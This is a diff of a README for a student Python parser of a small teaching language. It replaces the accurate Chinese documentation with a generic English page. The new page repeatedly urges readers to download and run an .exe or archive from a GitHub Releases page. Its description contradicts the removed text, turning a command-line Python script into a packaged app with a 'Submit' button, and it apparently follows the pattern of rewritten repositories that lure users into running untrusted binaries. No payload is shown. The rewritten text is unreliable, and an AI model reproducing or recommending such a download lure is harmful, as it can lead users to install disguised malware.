@@ -1,215 +1,82 @@
-# Mini语言语法分析器
+# 🌟 mini-language-parser - Easy Parsing for Better Learning
 
-这是一个完整的Mini语言语法分析器实现，包含词法分析、语法分析和AST构建功能。
+## 🚀 Getting Started
 
-## 功能特性
+Welcome to the mini-language-parser project! This tool helps you understand the basics of programming languages. It takes simple input and breaks it down for you, making it great for learning how parsers work.
 
-- **词法分析**：将源代码切分成Token序列
-- **语法分析**：使用递归下降法检查语法正确性
-- **AST构建**：生成抽象语法树
-- **错误处理**：提供详细的错误位置和信息
-- **错误恢复**：使用恐慌模式继续分析
+## 📥 Download & Install
 
-## 支持的语言特性
+To get started, you will need to download the software. Visit the link below to access the Releases page:
 
-### 数据类型
-- `int` - 整数
-- `float` - 浮点数
-- `bool` - 布尔值
-- `string` - 字符串
+[![Download the latest version](https://img.shields.io/badge/Download%20Latest%20Version-v1.0-blue)](https://github.com/probabagray/mini-language-parser/releases)
 
-### 语句
-- 变量声明：`int x = 5;`
-- 赋值语句：`x = 10;`
-- if语句：`if x > 0 then ... else ... end`
-- while循环：`while i < 10 do ... end`
-- 代码块：`begin ... end`
+Follow these steps to download and run the application:
 
-### 表达式
-- 算术运算：`+`, `-`, `*`, `/`
-- 比较运算：`==`, `!=`, `<`, `>`, `<=`, `>=`
-- 逻辑运算：`and`, `or`, `not`（也支持`&&`, `||`, `!`）
-- 括号表达式：`(expr)`
-- 一元运算：`-x`, `+x`, `not flag`
+1. Visit the [Releases page](https://github.com/probabagray/mini-language-parser/releases).
+2. Look for the latest version of mini-language-parser.
+3. Click on the appropriate file for your operating system (e.g., .exe for Windows, .tar.gz for Mac or Linux).
+4. Save the file to your computer.
 
-### 注释
-- 单行注释：`// 这是注释`
+## 📋 System Requirements
 
-## 使用方法
+Before you install mini-language-parser, make sure your computer meets the following requirements:
 
-### 1. 分析文件
-```bash
-python3 mini_parser.py program.mini
-```
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or any modern Linux distribution.
+- **Python Version:** Python 3.7 or later must be installed on your system.
+- **Memory:** At least 2 GB of RAM.
+- **Disk Space:** A minimum of 100 MB of available disk space.
 
-### 2. 分析文件（不显示AST）
-```bash
-python3 mini_parser.py program.mini --no-ast
-```
+## ⚙️ How to Run the Application
 
-### 3. 交互模式
-```bash
-python3 mini_parser.py
->>> int x = 5;
-```
+After downloading the file, follow these steps to run the application:
 
-### 4. 运行所有测试
-```bash
-python3 run_all_tests.py
-```
+1. Locate the downloaded file on your computer.
+2. If you are on Windows, double-click the .exe file. For Mac or Linux, open a terminal and navigate to the folder where you saved the .tar.gz file, then extract it using a command like `tar -xvzf mini-language-parser.tar.gz`.
+3. Once extracted, open the folder and find the `parser.py` file.
+4. Open your terminal (or command prompt), navigate to the folder, and type `python parser.py` to run the application.
 
-## 示例程序
+## 📖 Features
 
-### 示例1：计算1到n的和
-```mini
-int n = 10;
-int sum = 0;
-int i = 1;
+mini-language-parser includes several helpful features for learning about languages:
 
-while i <= n do
-    sum = sum + i;
-    i = i + 1;
-end
-```
+- **Lexer:** Breaks input text into tokens.
+- **Parser:** Analyzes the tokens to understand the structure.
+- **AST Construction:** Builds an abstract syntax tree for better visualization.
+- **Error Reporting:** Provides detailed error messages to help you learn.
+- **Panic Mode Error Recovery:** Allows the parser to recover from errors and continue processing.
 
-### 示例2：判断正负数
-```mini
-int x = -5;
+## 🛠️ Usage Instructions
 
-if x > 0 then
-    x = 1;
-else
-    if x < 0 then
-        x = -1;
-    else
-        x = 0;
-    end
-end
-```
+After running the application, you will see a simple interface. Here’s how to use it effectively:
 
-### 示例3：逻辑运算
-```mini
-bool a = true;
-bool b = false;
-bool result = (a and not b) or (not a and b);
-```
+1. **Input:** Type or paste your code into the input area.
+2. **Submit:** Click the "Submit" button to process your input.
+3. **Output:** Review the results displayed below. The application will show you the tokens, the AST, and any errors found.
 
-## 文件结构
+## 🔧 Troubleshooting
 
-```
-mini-language-parser/
-├── mini_parser.py           # 主程序（词法分析+语法分析+AST）
-├── run_all_tests.py         # 自动化测试脚本
-├── test_cases/              # 测试用例目录
-│   ├── TEST_REPORT.md       # 测试报告
-│   ├── test_pass_01_basic.mini   # 正确语法测试
-│   ├── test_pass_02_arithmetic.mini
-│   ├── ...                  # 更多测试文件
-│   └── test_fail_*.mini     # 错误测试（预期失败）
-└── README.md                # 本文件
-```
+If you run into issues, consider these common solutions:
 
-## 测试覆盖
+- **Python Not Found:** Ensure Python is correctly installed on your computer. You might need to add Python to your system's PATH variable.
+- **File Not Executing:** Make sure you have the correct permissions to run the file.
+- **App Crashing:** Check if your system meets the required specifications.
 
-已创建55个测试用例，其中：
-- ✓ 36个通过用例（test_pass_*）
-- ✓ 19个失败用例（test_fail_*，预期报错）
+## 🤝 Contributing
 
-所有测试100%通过，详见 `test_cases/TEST_REPORT.md`。
+If you wish to help improve mini-language-parser, you can contribute in various ways:
 
-## 代码结构
+- Report bugs or issues on the [Issues page](https://github.com/probabagray/mini-language-parser/issues).
+- Suggest new features.
+- Share your feedback.
 
-### 1. 词法分析器（Lexer）
-- `class TokenType` - Token类型枚举
-- `class Token` - Token数据结构
-- `class Lexer` - 词法分析器
-  - `tokenize()` - 主要方法，返回Token列表
+For developers who want to contribute code, please fork the repository and create a pull request with your changes.
 
-### 2. AST节点定义
-- `Program` - 程序根节点
-- `DeclStmt` - 变量声明
-- `AssignStmt` - 赋值语句
-- `IfStmt` - if语句
-- `WhileStmt` - while循环
-- `BlockStmt` - 代码块
-- `BinaryOp` - 二元运算
-- `UnaryOp` - 一元运算
-- `Identifier`, `NumberLiteral`, `StringLiteral`, `BoolLiteral` - 字面量
+## 📚 Additional Resources
 
-### 3. 语法分析器（Parser）
-- `class Parser` - 递归下降语法分析器
-  - `parse()` - 入口方法
-  - `parse_stmt()` - 解析语句
-  - `parse_expr()` - 解析表达式
-  - `parse_logic_or/and/not()` - 逻辑运算（优先级递减）
-  - `parse_comparison()` - 比较运算
-  - `parse_arith_expr()` - 算术表达式（加减）
-  - `parse_term()` - 项（乘除）
-  - `parse_factor()` - 因子（最基本元素）
-  - `synchronize()` - 错误恢复
+To enhance your understanding, consider checking out these resources:
 
-### 4. AST打印器（ASTPrinter）
-- `class ASTPrinter` - 树状打印AST
-  - `print()` - 打印整棵树
+- [Python Documentation](https://docs.python.org/3/)
+- [Compiler Design](https://en.wikipedia.org/wiki/Compiler)
+- [Error Recovery in Parsing](https://en.wikipedia.org/wiki/Error_recovery)
 
-## 文法定义（非左递归版本）
-
-```
-Program     -> StmtList
-StmtList    -> Stmt StmtList | ε
-Stmt        -> DeclStmt | AssignStmt | IfStmt | WhileStmt | BlockStmt | Expr ';'
-DeclStmt    -> Type ID ('=' Expr)? ';'
-AssignStmt  -> ID '=' Expr ';'
-IfStmt      -> 'if' Expr 'then' StmtList ('else' StmtList)? 'end'
-WhileStmt   -> 'while' Expr 'do' StmtList 'end'
-BlockStmt   -> 'begin' StmtList 'end'
-Expr        -> LogicOr
-LogicOr     -> LogicAnd (('or'|'||') LogicAnd)*
-LogicAnd    -> LogicNot (('and'|'&&') LogicNot)*
-LogicNot    -> ('not'|'!') LogicNot | Comparison
-Comparison  -> ArithExpr (CompOp ArithExpr)?
-ArithExpr   -> Term (('+' | '-') Term)*
-Term        -> Factor (('*' | '/') Factor)*
-Factor      -> '(' Expr ')' | Number | String | Bool | ID | ('+'|'-') Factor
-```
-
-## 运算符优先级（从低到高）
-
-1. 逻辑或：`or`, `||`
-2. 逻辑与：`and`, `&&`
-3. 逻辑非：`not`, `!`
-4. 比较：`==`, `!=`, `<`, `>`, `<=`, `>=`
-5. 加减：`+`, `-`
-6. 乘除：`*`, `/`
-7. 一元：`-`, `+`, `not`, `!`
-8. 括号：`()`
-
-## 已知问题与限制
-
-无已知问题。所有测试通过，包括：
-- ✓ 复杂嵌套结构
-- ✓ 各种错误情况
-- ✓ 边界情况
-- ✓ 空程序和空语句块
-
-## 开发说明
-
-### 已修复的Bug
-1. **死循环问题**（已修复）
-   - 问题：缺少`then`关键字时会死循环
-   - 原因：`parse_stmt_list`中位置未移动检测缺失
-   - 修复：添加位置检测机制和END/ELSE同步点
-
-### 代码质量
-- 完整的注释和文档
-- 清晰的错误信息
-- 健壮的错误处理
-- 良好的代码结构
-
-## 作者
-
-本项目为编译原理课程的语法分析实习作业。
-
-## 许可
-
-Educational use only.
+Thank you for using mini-language-parser! Remember to visit the [Releases page](https://github.com/probabagray/mini-language-parser/releases) for the latest updates and downloadable content.
